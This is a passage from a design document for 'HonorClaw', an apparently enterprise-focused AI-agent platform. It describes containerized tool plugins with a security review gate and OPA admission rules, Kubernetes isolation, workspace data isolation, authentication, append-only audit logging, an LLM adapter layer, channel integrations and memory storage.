Tool execution happens in **separate Pods** (in `honorclaw-tools` namespace) from the agent runtime. A `database_query` tool runs in a pod with database network access but no internet access. A `web_search` tool runs in a pod with internet access (through the Policy Proxy) but no database access. This prevents a compromised tool from being used as a pivot.

---

## 5. Tool Extensibility System

### Overview

HonorClaw supports adding new tools through a secure, containerized plugin system. Unlike OpenClaw's community-contributed skills (which run in the agent's process with full access), HonorClaw tools are **isolated containers** that communicate through a well-defined interface, vetted through a security review gate before deployment.

### Tool Registration Model

A tool is defined by three artifacts:

1. **Tool Manifest** (`honorclaw-tool.yaml`) — Declares the tool's interface, parameters, network requirements, and security metadata
2. **Container Image** — OCI-compliant image implementing the HonorClaw tool interface
3. **Security Review Record** — Signed attestation from the security review gate

```yaml
# honorclaw-tool.yaml — Tool Manifest
apiVersion: honorclaw.io/v1
kind: Tool
metadata:
  name: "salesforce-query"
  version: "1.3.0"
  author: "acme-corp"
  description: "Query Salesforce objects with SOQL"
  license: "MIT"
  repository: "https://github.com/acme-corp/honorclaw-tool-salesforce"

spec:
  # Tool interface definition (what the agent sees)
  interface:
    parameters:
      - name: "query"
        type: "string"
        description: "SOQL query string"
        required: true
      - name: "object_type"
        type: "string"
        description: "Salesforce object type"
        required: true
        enum: ["Account", "Contact", "Opportunity", "Lead", "Case"]
      - name: "limit"
        type: "integer"
        description: "Maximum records to return"
        default: 100
        min: 1
        max: 2000
    returns:
      type: "object"
      properties:
        records:
          type: "array"
          description: "Query result records"
        total_count:
          type: "integer"

  # Container spec
  container:
    image: "registry.honorclaw.io/acme-corp/salesforce-query:1.3.0"
    resources:
      requests:
        cpu: "100m"
        memory: "128Mi"
      limits:
        cpu: "500m"
        memory: "512Mi"
    timeout_seconds: 30
    read_only_root: true
    run_as_non_root: true

  # Network requirements (reviewed during security gate)
  network:
    egress:
      - domain: "*.salesforce.com"
        ports: [443]
        protocol: "HTTPS"
      - domain: "*.force.com"
        ports: [443]
        protocol: "HTTPS"
    # No other egress permitted

  # Secrets the tool needs (injected by Control Plane, never visible to agent)
  secrets:
    - name: "SALESFORCE_CLIENT_ID"
      vault_path: "workspaces/{workspace_id}/integrations/salesforce/client_id"
    - name: "SALESFORCE_CLIENT_SECRET"
      vault_path: "workspaces/{workspace_id}/integrations/salesforce/client_secret"
    - name: "SALESFORCE_REFRESH_TOKEN"
      vault_path: "workspaces/{workspace_id}/integrations/salesforce/refresh_token"

  # Trust level (set by security review, not by author)
  trust:
    level: "tenant"    # first-party | verified | tenant | unreviewed
    reviewed_at: null   # Set by security gate
    reviewed_by: null   # Set by security gate
    attestation: null   # Set by security gate (signed hash)

  # Compatibility
  sdk_version: ">=1.0.0 <2.0.0"
  honorclaw_version: ">=0.5.0"
```

### Security Review Gate

Unlike OpenClaw (community tools, no vetting), every HonorClaw tool passes through a security review before it can be used in production.

**Review Pipeline:**

```
Tool Submission → Automated Scan → Manual Review (if required) → Approval → Registry Publication
       │                │                    │                        │
       ▼                ▼                    ▼                        ▼
  Upload manifest   Trivy (CVE)         Human reviewer           Signed attestation
  + image to        Semgrep (SAST)      reviews network          stored in registry
  staging registry  Syft (SBOM)         reqs, secrets access,    metadata. Image
                    Grype (deps)        parameter validation,    tagged as approved.
                    OPA policy check    data handling.
                    Network policy      Required for:
                    simulation          - internet egress
                                        - secrets access
                                        - first-party trust
```

**Trust Levels:**

| Level | Description | Review Required | Capabilities |
|-------|-------------|----------------|-------------|
| **first-party** | Built by HonorClaw team, ships with the platform | Internal review + automated scan | Full (within manifest) |
| **verified** | Third-party, reviewed and signed by HonorClaw team | Full review (automated + manual) | Full (within manifest) |
| **tenant** | Built by the tenant's own team | Automated scan only (tenant accepts risk) | Restricted: no internet egress unless workspace admin approves |
| **unreviewed** | Submitted but not yet reviewed | Pending | Cannot be added to any capability manifest |

**Automated Security Checks (all trust levels):**

```yaml
# OPA policy for tool admission
package honorclaw.tool.admission

# Container must run as non-root
deny[msg] {
  not input.spec.container.run_as_non_root
  msg := "Container must run as non-root user"
}

# Container must have read-only root filesystem
deny[msg] {
  not input.spec.container.read_only_root
  msg := "Container must have read-only root filesystem"
}

# No wildcard egress
deny[msg] {
  some i
  input.spec.network.egress[i].domain == "*"
  msg := "Wildcard egress domain not permitted"
}

# Secrets must reference tenant-scoped vault paths
deny[msg] {
  some i
  secret := input.spec.secrets[i]
  not startswith(secret.vault_path, "workspaces/{workspace_id}/")
  msg := sprintf("Secret '%s' must use tenant-scoped vault path", [secret.name])
}

# Resource limits must be set
deny[msg] {
  not input.spec.container.resources.limits.cpu
  msg := "CPU limit is required"
}

# Image must come from approved registry
deny[msg] {
  not startswith(input.spec.container.image, "registry.honorclaw.io/")
  msg := "Image must be hosted on registry.honorclaw.io"
}
```

**Who/what approves a tool:**
- **Automated scan**: Required for all tools. Runs on submission. Blocks if any OPA policy violation, critical CVE, or known-malicious pattern detected.
- **Workspace admin**: Can approve `custom`-level tools for their own organization (they accept the risk). Cannot grant `verified` or `first-party` trust.
- **HonorClaw platform admin**: Required to grant `verified` trust. Reviews network requirements, secrets access, and data handling patterns manually.
- **`first-party` tools**: Only the HonorClaw development team can publish at this level. These ship with the platform and are part of the core release.

### Tool Isolation (Container Spec)

Each tool execution runs in an ephemeral Pod in the `honorclaw-tools` namespace:

```yaml
# Generated by Tool Execution Layer at runtime
apiVersion: v1
kind: Pod
metadata:
  name: "tool-exec-{execution_id}"
  namespace: "honorclaw-tools"
  labels:
    honorclaw.io/tool: "salesforce-query"
    honorclaw.io/tool-version: "1.3.0"
    honorclaw.io/tenant: "acme-corp"
    honorclaw.io/session: "sess-uuid"
spec:
  serviceAccountName: "honorclaw-tool-runner"  # minimal RBAC
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: tool
      image: "registry.honorclaw.io/acme-corp/salesforce-query:1.3.0"
      securityContext:
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: "100m"
          memory: "128Mi"
        limits:
          cpu: "500m"
          memory: "512Mi"
      env:
        # Secrets injected by Vault sidecar or init container — NOT from agent
        - name: SALESFORCE_CLIENT_ID
          valueFrom:
            secretKeyRef:
              name: "tool-secrets-{execution_id}"
              key: "SALESFORCE_CLIENT_ID"
        # Tool invocation payload (parameters from agent, validated by Tool Execution Layer)
        - name: HONORCLAW_TOOL_INPUT
          value: '{"query": "SELECT Id, Name FROM Account", "object_type": "Account", "limit": 10}'
        - name: HONORCLAW_TOOL_TIMEOUT
          value: "30"
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir:
        sizeLimit: "50Mi"
  restartPolicy: Never
  activeDeadlineSeconds: 60  # hard kill after 60s
```

**NetworkPolicy for tool pods** (generated per-tool from manifest):

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: "tool-netpol-salesforce-query"
  namespace: "honorclaw-tools"
spec:
  podSelector:
    matchLabels:
      honorclaw.io/tool: "salesforce-query"
  policyTypes: ["Egress"]
  egress:
    # Only Salesforce domains (resolved by DNS policy or Cilium FQDN)
    - to:
        - ipBlock:
            cidr: "0.0.0.0/0"  # Cilium FQDN policy narrows this to *.salesforce.com, *.force.com
      ports:
        - port: 443
          protocol: TCP
    # DNS resolution
    - to: []
      ports:
        - port: 53
          protocol: UDP
```

### Tool Discovery

Agent administrators discover and manage tools through the **HonorClaw Admin UI** and **CLI**:

```bash
# List available tools in the registry
honorclaw tools list
# NAME                VERSION  TRUST       AUTHOR       DESCRIPTION
# web-search          1.2.0    first-party honorclaw     Search the web via Brave API
# database-query      2.0.1    first-party honorclaw     Execute read-only SQL queries
# file-ops            1.1.0    first-party honorclaw     Read/write agent workspace files
# http-request        1.0.0    first-party honorclaw     Make HTTP requests (via Policy Proxy)
# email-send          1.0.0    first-party honorclaw     Send emails via SMTP/SES/SendGrid
# salesforce-query    1.3.0    tenant      acme-corp    Query Salesforce objects
# slack-post          1.0.0    verified    honorclaw     Post messages to Slack channels

# View tool details
honorclaw tools inspect salesforce-query:1.3.0

# Add a tool to an agent's capability manifest
honorclaw agents add-tool sales-assistant --tool salesforce-query:1.3.0 \
  --param-constraint 'object_type:allowed_values=Account,Contact' \
  --rate-limit 'max_calls_per_minute=5'

# Submit a new tool for review
honorclaw tools submit ./my-tool/ --trust-level custom

# Check review status
honorclaw tools review-status my-custom-tool:1.0.0
```

**Admin UI** provides a visual tool catalog with:
- Searchable registry with trust level badges
- Per-tool security report (CVE scan results, SBOM, network requirements)
- One-click "Add to Agent" with parameter constraint configuration
- Manifest diff view when updating tool versions

### First-Party vs. Third-Party Tools

| Aspect | First-Party | Verified Third-Party | Workspace Tools |
|--------|-------------|---------------------|-------------|
| **Author** | HonorClaw team | External developer, reviewed by HonorClaw | Tenant's own team |
| **Trust Level** | `first-party` | `verified` | `custom` |
| **Ships with platform** | Yes | Available in public registry | Private to tenant |
| **Security review** | Internal (part of release) | Full (automated + manual) | Automated only |
| **Internet egress** | Per-manifest | Per-manifest (reviewed) | Requires workspace admin approval |
| **Secrets access** | Platform + workspace scoped | Workspace scoped only | Workspace scoped only |
| **Update mechanism** | Platform release | Registry pull (version pinned in manifest) | Tenant pushes to private registry |
| **SLA** | Platform SLA | Best-effort | Tenant's responsibility |

**First-party tools** (ship with HonorClaw):
- `web-search` — Web search via configurable provider (Brave, Bing, Google)
- `database-query` — Read-only SQL against configured databases
- `file-ops` — Read/write/list files in agent workspace (S3-backed)
- `http-request` — HTTP GET/POST (via Policy Proxy, domain-restricted)
- `email-send` — Send emails via configurable provider (SMTP, SES, SendGrid)
- `code-execution` — Sandboxed code execution (restricted Docker/gVisor)
- `memory-search` — Semantic search in agent's vector memory
- `calendar-read` — Read calendar events (Google, Outlook, CalDAV)

### Tool Versioning

Tool versions follow semver. Capability manifests **pin to a specific version** (not `latest`):

```yaml
tools:
  - name: "salesforce-query"
    source: "honorclaw/salesforce-query:1.3.0"  # pinned
```

**When a tool is updated:**

| Scenario | Behavior |
|----------|----------|
| **Patch update** (1.3.0 → 1.3.1) | Security fix. Admins can configure auto-update for patches. Existing manifests continue using 1.3.0 until manually updated or auto-update applies. |
| **Minor update** (1.3.0 → 1.4.0) | New features, backward compatible. Manifests remain on 1.3.0. Admin must explicitly update. |
| **Major update** (1.3.0 → 2.0.0) | Breaking changes. Manifests remain on 1.3.0. Admin must explicitly update. Migration guide provided. |
| **Security advisory** | Critical CVEs trigger a **forced deprecation**: the old version is marked `deprecated` in the registry with a deadline. Manifests referencing deprecated tools show warnings in the admin UI. After the deadline, tool calls to deprecated versions are rejected. |
| **Tool removal** | A tool can be unpublished from the registry. Existing manifests referencing it continue to work (image is still in registry) but the tool shows as `deprecated`. No new manifests can add it. |

**Version resolution at runtime:**
The Tool Execution Layer resolves `honorclaw/salesforce-query:1.3.0` to the exact image digest (`sha256:abc123...`) at manifest save time. This digest is stored in the manifest, ensuring the exact same image runs regardless of registry mutations.

### Developer Experience (Custom Tools)

Building a custom HonorClaw tool requires:

1. **Implement the tool interface** (any language — tools are containers communicating via stdin/stdout JSON protocol)
2. **Write the tool manifest** (`honorclaw-tool.yaml`)
3. **Build and push a container image**
4. **Submit for review**

**Any-language protocol:**

Tools communicate via a simple JSON protocol on stdin/stdout:

```
← STDIN (from Tool Execution Layer):
{"parameters": {"query": "SELECT Id FROM Account", "object_type": "Account", "limit": 10}, "timeout_seconds": 30}

→ STDOUT (tool response):
{"status": "success", "result": {"records": [...], "total_count": 5}}

→ STDOUT (error):
{"status": "error", "error": {"code": "AUTH_FAILED", "message": "Salesforce authentication failed"}}
```

**Container requirements:**
- Must accept `HONORCLAW_TOOL_INPUT` env var (JSON) or read from stdin
- Must write result to stdout as JSON
- Must exit with code 0 on success, non-zero on error
- Must respect `HONORCLAW_TOOL_TIMEOUT` (graceful shutdown on SIGTERM)
- Must run as non-root
- Must work with read-only root filesystem (use /tmp for scratch)
- Image must be < 500MB (recommended < 100MB)

**Developer workflow:**

```bash
# Scaffold a new tool
honorclaw tools init my-tool --language typescript
# Creates: my-tool/
#   ├── honorclaw-tool.yaml     (manifest template)
#   ├── src/index.ts            (tool implementation)
#   ├── Dockerfile              (multi-stage build)
#   ├── package.json
#   └── test/                   (test harness)

# Local development (runs tool in Docker with mock inputs)
honorclaw tools dev ./my-tool --input '{"query": "test"}'

# Run security scan locally
honorclaw tools scan ./my-tool

# Build and push
docker build -t registry.honorclaw.io/acme-corp/my-tool:1.0.0 ./my-tool
docker push registry.honorclaw.io/acme-corp/my-tool:1.0.0

# Submit for review
honorclaw tools submit ./my-tool --trust-level custom
```

---

## 6. Workspace Data Isolation

> **Note (2026-03-06):** HonorClaw uses `workspace_id` (not tenant) for logical grouping. Isolation is **application-level RBAC**, not database-level RLS. PostgreSQL RLS is an optional Tier 3+ enhancement for deployments requiring stronger isolation guarantees. The baseline is workspace_id column enforcement in every query — see Prompt 0.3.

### Isolation Model: Shared Infrastructure, Logical Isolation

For enterprise SaaS, the right model is **shared compute/database infrastructure with strong logical isolation** — not separate cloud accounts per tenant (which is operationally unsustainable for a solo developer).

**Isolation layers:**

| Layer | Mechanism | Enforcement |
|-------|-----------|-------------|
| **Compute** | Separate Kubernetes Pods per tenant agent | Pod security context + NetworkPolicy |
| **Database** | Shared PostgreSQL cluster, row-level security | `workspace_id` on every table, enforced by RLS policies |
| **Object Storage** | Shared bucket, per-tenant prefix | Application-level enforcement + bucket policy |
| **Encryption** | Per-tenant encryption key | Vault Transit (or cloud KMS via adapter) |
| **Network** | Shared cluster, agent traffic isolated via NetworkPolicy | Namespace-level deny-all + explicit allowlists |
| **Memory/Search** | pgvector with workspace_id + agent_id filters | Index-level access control |
| **Cache** | Shared Redis, key prefix per tenant | Application-level enforcement + Redis ACLs |

### Database Design (PostgreSQL)

```sql
-- Every table includes workspace_id, enforced by RLS
CREATE TABLE agents (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    workspace_id UUID NOT NULL REFERENCES workspaces(id),
    name TEXT NOT NULL,
    capability_manifest JSONB NOT NULL,
    status TEXT NOT NULL DEFAULT 'active',
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Isolation via workspace_id column in every query (application-level RBAC; RLS is Tier 3+ optional)
ALTER TABLE agents ENABLE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON agents
    USING (workspace_id = current_setting('app.workspace_id')::UUID);

-- Application sets tenant context on every connection:
-- SET app.workspace_id = '<tenant-uuid>';
```

**When to consider dedicated infrastructure:** If a customer requires FedRAMP High, ITAR, or data sovereignty guarantees, they need dedicated infrastructure. This is a future add-on (HonorClaw Dedicated), not the base architecture.

---

## 7. Auth Stack

### Architecture (Tiered)

**Tier 1 (built-in):**
```
User → Control Plane (built-in auth) → JWT → API
              │
    ┌─────────┴─────────┐
    │                   │
  Local DB auth     OIDC Federation
  (bcrypt + TOTP)   (any external IdP)
```

**Tier 3+ (Keycloak):**
```
User → Ingress → Keycloak (auth) → JWT → Control Plane API
                      │
            ┌─────────┴─────────┐
            │                   │
      Keycloak Realm       SAML/OIDC Federation
      (email/password)     (Okta, Azure AD, Google)
```

### Tier 1: Built-In Auth (BuiltInIdentityProvider)

For single-node deployments, auth is built directly into the Control Plane — no external identity service required. This is the same model used by Gitea, Outline, Mattermost, and other self-hosted tools.

**Capabilities:**
- **Email/password authentication**: bcryptjs-hashed passwords stored in PostgreSQL (`users` table). Configurable password policies (min length, complexity, breach checking via k-anonymity API).
- **TOTP MFA**: TOTP secrets encrypted with the master key, stored in PostgreSQL. Standard RFC 6238 — works with any authenticator app.
- **JWT issuance**: RS256 JWTs issued by the Control Plane. Signing key pair generated on `honorclaw init`, stored encrypted in the secrets table. Access token (15min) + refresh token (7d) + rotation.
- **OIDC federation**: Configure any OIDC-compliant external IdP (Okta, Azure AD, Google, Auth0, Keycloak) via `honorclaw.yaml`. The Control Plane acts as the OIDC relying party — validates `id_token`, maps claims to HonorClaw roles, creates/updates local user record. **SSO works without Keycloak.**
- **Brute-force protection**: Account lockout after N failed attempts (configurable), IP-based rate limiting.
- **Admin UI**: User management (create, disable, reset password, assign roles) in the HonorClaw web interface.

**What Tier 1 auth does NOT support:**
- SAML 2.0 federation (OIDC only — covers 95% of IdPs since most support OIDC now)
- WebAuthn/FIDO2 (TOTP only for MFA)
- Per-tenant user pool isolation (single-tenant deployment, so not needed)

**Database schema (built-in auth):**
```sql
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    workspace_id UUID NOT NULL REFERENCES workspaces(id),
    email TEXT NOT NULL UNIQUE,
    password_hash TEXT,                    -- bcrypt, NULL for SSO-only users
    totp_secret_encrypted BYTEA,           -- AES-256-GCM with master key
    totp_enabled BOOLEAN DEFAULT false,
    oidc_provider TEXT,                    -- 'okta', 'azure-ad', etc.
    oidc_subject TEXT,                     -- external IdP subject claim
    failed_login_attempts INTEGER DEFAULT 0,
    locked_until TIMESTAMPTZ,
    roles TEXT[] NOT NULL DEFAULT '{"agent-user"}',
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE jwt_signing_keys (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    private_key_encrypted BYTEA NOT NULL,  -- RSA-2048, encrypted with master key
    public_key TEXT NOT NULL,               -- PEM, used for JWKS endpoint
    active BOOLEAN DEFAULT true,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
```

### Tier 3+: Keycloak (External IdP)

For multi-tenant Kubernetes deployments, Keycloak (or any external OIDC/SAML provider) replaces built-in auth:

- Per-workspace Keycloak realms for full user pool isolation
- SAML 2.0 + OIDC federation (Okta, Azure AD, Google Workspace, PingIdentity)
- WebAuthn/FIDO2 MFA support
- Advanced features: social login, identity brokering, fine-grained authorization
- The `KeycloakIdentityProvider` validates JWTs against Keycloak's JWKS endpoint — same interface, different backend

**Migration path (Tier 1 → Tier 3):** Export users from PostgreSQL → import into Keycloak realm. Passwords cannot be migrated (bcryptjs hashes aren't portable to Keycloak's credential store) — users reset passwords on first login. OIDC-federated users migrate seamlessly (same external IdP subject).

### JWT Token Flow (same for both tiers)

```
1. User authenticates (built-in DB auth, or redirected to external OIDC IdP)
2. Identity provider (built-in or Keycloak) issues JWT with claims:
   {
     "sub": "user-uuid",
     "workspace_id": "acme-corp-uuid",
     "roles": ["agent-admin", "agent-user"],
     "agents": ["sales-assistant", "support-bot"],
     "iat": 1772700000,
     "exp": 1772703600
   }
3. All API calls include Bearer token
4. Control Plane validates JWT signature (built-in JWKS or external IdP JWKS endpoint)
5. Control Plane sets tenant context for all downstream operations
6. Agent runtime receives ONLY the workspace_id and authorized scope — never the JWT
```

### Authorization Model (RBAC)

| Role | Permissions |
|------|-------------|
| **Workspace Admin** | Manage agents, users, integrations, view all audit logs, approve workspace tools |
| **Agent Admin** | Create/modify agents, edit capability manifests, approve tools for their agents |
| **Agent User** | Interact with agents they're authorized for |
| **Auditor** | Read-only access to audit logs, agent configs (no interaction) |
| **API Service** | Machine-to-machine, scoped to specific agents/operations |

### Key Principle: Agents Never See Auth Tokens

The agent runtime receives a session context object from the Control Plane:
```json
{
  "session_id": "sess-uuid",
  "workspace_id": "acme-corp-uuid",
  "user_id": "user-uuid",
  "user_display_name": "Jane Smith",
  "agent_id": "sales-assistant",
  "capabilities": { /* resolved manifest */ },
  "started_at": "2026-03-05T10:00:00Z"
}
```

No JWT, no API keys, no credentials. The agent knows who it's talking to and what it can do — nothing about how auth works.

---

## 8. Audit Logging Architecture

### What Must Be Logged

| Event Category | Events | Compliance Mapping |
|---------------|--------|-------------------|
| **Authentication** | Login, logout, MFA challenge, failed login, token refresh, SSO federation | SOC 2 CC6.1, HIPAA §164.312(d), FedRAMP AU-2 |
| **Authorization** | Permission check (granted/denied), role change, manifest update | SOC 2 CC6.3, FedRAMP AC-6 |
| **Agent Sessions** | Session start, end, duration, user, agent, model used | SOC 2 CC7.2, HIPAA §164.312(b) |
| **LLM Interactions** | Prompt sent (hashed/redacted), model response (hashed/redacted), tokens used, model, latency | SOC 2 CC7.2, custom |
| **Tool Calls** | Tool name, parameters, result (success/fail/rejected), execution time, rejection reason | SOC 2 CC6.1, FedRAMP AU-12 |
| **Data Access** | Database queries executed, storage objects accessed, memory reads/writes | HIPAA §164.312(b), FedRAMP AU-12 |
| **Policy Violations** | Blocked tool calls, egress denials, PII detection triggers, rate limit hits | SOC 2 CC6.8, FedRAMP SI-4 |
| **Admin Actions** | Agent created/modified/deleted, manifest updated, user role changed, integration configured | SOC 2 CC6.2, FedRAMP CM-5 |
| **Data Export** | Any data leaving the system (email, API response, file download) | HIPAA §164.312(e), custom |

### Storage Architecture (Tiered)

**Tier 1 — PostgreSQL (built-in):**
```
Event → Control Plane → PostgreSQL audit_events table (append-only)
                              │
                         SQL queries directly (built-in audit viewer in Admin UI)
                              │
                         Optional: periodic export → local filesystem / S3-compatible
```

```sql
-- Append-only audit table (Tier 1)
CREATE TABLE audit_events (
    id BIGSERIAL PRIMARY KEY,
    event_id UUID NOT NULL DEFAULT gen_random_uuid(),
    timestamp TIMESTAMPTZ NOT NULL DEFAULT now(),
    workspace_id UUID NOT NULL,
    category TEXT NOT NULL,        -- 'auth', 'tool_call', 'policy_violation', etc.
    action TEXT NOT NULL,
    outcome TEXT NOT NULL,         -- 'success', 'rejected', 'error'
    actor JSONB NOT NULL,
    agent JSONB,
    request JSONB,
    metadata JSONB,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Append-only enforcement: no DELETE or UPDATE via trigger
CREATE OR REPLACE FUNCTION prevent_audit_mutation() RETURNS TRIGGER AS $$
BEGIN
  RAISE EXCEPTION 'audit_events is append-only: % not permitted', TG_OP;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER audit_no_update BEFORE UPDATE ON audit_events
  FOR EACH ROW EXECUTE FUNCTION prevent_audit_mutation();
CREATE TRIGGER audit_no_delete BEFORE DELETE ON audit_events
  FOR EACH ROW EXECUTE FUNCTION prevent_audit_mutation();

-- Partition by month for efficient queries and archival
CREATE TABLE audit_events_2026_03 PARTITION OF audit_events
  FOR VALUES FROM ('2026-03-01') TO ('2026-04-01');

-- Index for common queries
CREATE INDEX idx_audit_tenant_time ON audit_events (workspace_id, timestamp DESC);
CREATE INDEX idx_audit_category ON audit_events (category, timestamp DESC);
```

Not true WORM (a superuser could drop triggers), but sufficient for Tier 1's threat model (single-tenant, trusted operator). For compliance-grade immutability, upgrade to Tier 3+ with object storage WORM.

**Tier 3+ — Fluent Bit → WORM storage + search:**
```
Event → Control Plane → Fluent Bit (sidecar) → Object Storage (WORM) + OpenSearch
                                                       │
                                                  SQL query engine
                                                  (Athena / Trino / DuckDB)
```

**Immutable Audit Trail (Tier 3+ — S3-compatible + WORM):**

| Cloud | Storage | Immutability Mechanism |
|-------|---------|----------------------|
| AWS | S3 | Object Lock (WORM compliance mode) |
| GCP | GCS | Retention policies (bucket lock) |
| Azure | Blob Storage | Immutability policies (time-based retention) |
| On-Prem | MinIO | Object Lock (S3-compatible WORM) |

- Retention: 7 years (configurable per compliance requirement)
- Per-tenant encryption via `EncryptionProvider`
- Lifecycle: hot → warm → cold (provider-specific tiering)
- Queryable via SQL engine (Athena on AWS, Trino on-prem, DuckDB for small deployments)

**Real-Time Audit Search (Tier 3+ — OpenSearch):**
- Hot window: 90 days of searchable logs
- Index-per-tenant for isolation
- OpenSearch Dashboards for visual exploration
- Alerting rules for anomalies (unusual tool call patterns, high rejection rates)

**Migration (Tier 1 → Tier 3):** `honorclaw audit export --since 2026-01-01` dumps events as JSONL → import into OpenSearch and WORM storage.

### Audit Record Schema

```json
{
  "event_id": "evt-uuid",
  "timestamp": "2026-03-05T10:15:23.456Z",
  "workspace_id": "acme-corp-uuid",
  "actor": {
    "type": "user|agent|system",
    "id": "user-uuid",
    "display_name": "Jane Smith",
    "ip_address": "203.0.113.42",
    "user_agent": "Mozilla/5.0..."
  },
  "agent": {
    "id": "sales-assistant",
    "session_id": "sess-uuid"
  },
  "event": {
    "category": "tool_call",
    "action": "database_query",
    "outcome": "rejected",
    "reason": "parameter 'database' value 'production' not in allowed_values"
  },
  "request": {
    "tool": "database_query",
    "parameters_hash": "sha256:abc123...",
    "parameters_redacted": { "query": "[REDACTED]", "database": "production" }
  },
  "metadata": {
    "manifest_version": 3,
    "model": "claude-sonnet-4-6",
    "tokens_used": 0,
    "duration_ms": 2
  }
}
```

### Key Design Decisions

- **Prompt/response content is hashed by default**, not stored in clear text — PII/PHI in prompts is a HIPAA concern. Tenants can opt-in to full content logging.
- **Immutability is physical** (object lock/WORM), not application-level. Even a cloud root account cannot delete locked objects during the retention period.
- **Fluent Bit sidecars handle buffering and delivery** — the Control Plane writes audit events to a Unix socket; Fluent Bit handles reliable delivery to storage + search. This keeps the critical path fast and decouples the audit pipeline from any specific cloud service.
- **SQL engine for compliance queries** ("show me all PII detections for tenant X in Q1 2026") — Athena on AWS, Trino for multi-cloud/on-prem, DuckDB for small deployments.

---

## 9. Model-Agnostic LLM Layer

### Architecture: Custom Adapter Pattern

```
Agent Runtime → LLM Router (Control Plane) → Provider Adapter → LLM API
                      │
                      ├─ ClaudeAdapter → Anthropic API (direct or Bedrock/Vertex)
                      ├─ OpenAIAdapter → OpenAI API (direct or Azure OpenAI)
                      ├─ GeminiAdapter → Google AI API (direct or Vertex)
                      ├─ OllamaAdapter → Self-hosted Ollama (on-prem)
                      └─ CustomAdapter → Any OpenAI-compatible endpoint
```

### Why Not LiteLLM

LiteLLM is the obvious choice for model abstraction, and it's a good library — but for HonorClaw, a custom adapter layer is preferable:

1. **Security surface area**: LiteLLM is a large dependency with its own network behavior, proxy mode, caching, and logging. Each of these is a potential data leak or vulnerability.
2. **Credential isolation**: LiteLLM expects API keys in environment variables or config files. HonorClaw needs API keys to live exclusively in Vault, fetched by the trusted Control Plane, and never visible to the agent runtime.
3. **Audit integration**: Every LLM call needs to be audit-logged with tenant context, token counts, model selection rationale, and latency.
4. **The adapter interface is simple**: `sendMessages(messages, tools, config) → response`. Each provider is 100-200 lines.

### LLM Router

```typescript
interface LLMRequest {
  messages: Message[];
  tools?: ToolDefinition[];
  model: string;
  max_tokens: number;
  temperature: number;
  workspace_id: string;
  session_id: string;
}

interface LLMRouter {
  route(request: LLMRequest): Promise<LLMResponse>;
}
```

**API key isolation**: The router fetches provider API keys from the `SecretsProvider` using the Control Plane's identity. Keys are cached in-memory with short TTLs. They are NEVER passed to the agent runtime, written to disk, included in environment variables, or logged.

---

## 10. Secure Channel Integrations

### ChannelAdapter Interface

All channel adapters implement a common interface (`packages/core/src/types/channel.ts`):

```typescript
interface ChannelAdapter {
  handleInbound(message: InboundMessage): Promise<SessionReference>
  sendOutbound(sessionId: string, message: OutboundMessage): Promise<void>
  sendEscalation(sessionId: string, context: EscalationContext): Promise<void>
}
```

Adapters: Slack (Section 2), Web UI (Section 2), CLI (Section 2), Teams/Discord/Email (Section 6).

**Note:** Slack-as-channel (this adapter — receives/sends messages) is separate from Slack-as-tool (Section 3 — programmatic API access). Different token paths, different purpose.

### Slack Integration

**Architecture:**

```
Slack → Slack Events API → Ingress → Slack Channel Adapter → Control Plane
                                           │
                                1. Verify Slack signing secret (HMAC)
                                2. Verify timestamp (prevent replay)
                                3. Map Slack user → HonorClaw user (Keycloak)
                                4. Map Slack channel → agent + permissions
                                5. Sanitize message content
                                6. Route to Control Plane as authenticated request
```

**OAuth scopes (minimal):**
- `chat:write`, `channels:history`, `users:read`, `commands`
- No `admin.*` scopes. No `files:write`. No broad channel access.

### Web UI

- React SPA served via CDN
- WebSocket to Control Plane for real-time streaming
- JWT auth (Keycloak) — token in httpOnly secure cookie
- CSP headers, X-Frame-Options, HSTS

### API + CLI

- REST API via Ingress + Control Plane
- API keys (per-tenant, per-integration) stored in Vault
- CLI authenticates via OAuth 2.0 Device Authorization Grant
- Token cached in OS keychain

---

## 11. Memory and Persistence Layer

### Memory Taxonomy

| Memory Type | Description | Store | TTL |
|-------------|-------------|-------|-----|
| **Working Memory** | Current conversation context, tool call state | Redis | Session duration |
| **Session History** | Past messages in current session | Redis → PostgreSQL (on session end) | Session: Redis; Archive: PostgreSQL |
| **Episodic Memory** | Long-term facts, learnings, user preferences | pgvector in PostgreSQL (Tier 1) / OpenSearch (Tier 3+) | Indefinite |
| **Agent Config** | Capability manifests, system prompts, tool definitions | PostgreSQL | Versioned, indefinite |
| **Tool State** | Persistent state for stateful tools | Local filesystem (Tier 1) / S3-compatible (Tier 3+) | Configurable |
| **Audit Memory** | Compliance-grade event log | PostgreSQL append-only (Tier 1) / S3-compatible WORM + OpenSearch (Tier 3+) | 7 years |

### Redis — Working Memory

```
Key schema:
  session:{session_id}:messages     → List of conversation messages
  session:{session_id}:state        → JSON blob of current session state
  session:{session_id}:tool_state   → Pending tool call state
  tenant:{workspace_id}:token_budget   → Token usage counter
  agent:{agent_id}:rate_limit       → Rate limit counters

Redis 7+ with ACLs (different credentials for Control Plane vs Agent Runtime).
Encryption in transit (TLS) and at rest (provider-dependent).
```

### PostgreSQL — Control Plane DB

Core tables: `tenants`, `users`, `user_roles`, `agents`, `capability_manifests` (versioned), `tool_definitions`, `tool_registry`, `integrations`, `channel_configs`, `session_archives`, `approval_requests`, `api_keys`

RLS on every table. Per-tenant encryption key for sensitive columns.

### Vector Memory (Tiered)

**Tier 1 — pgvector (built-in):**
```sql
-- Vector memory in PostgreSQL (requires pgvector extension)
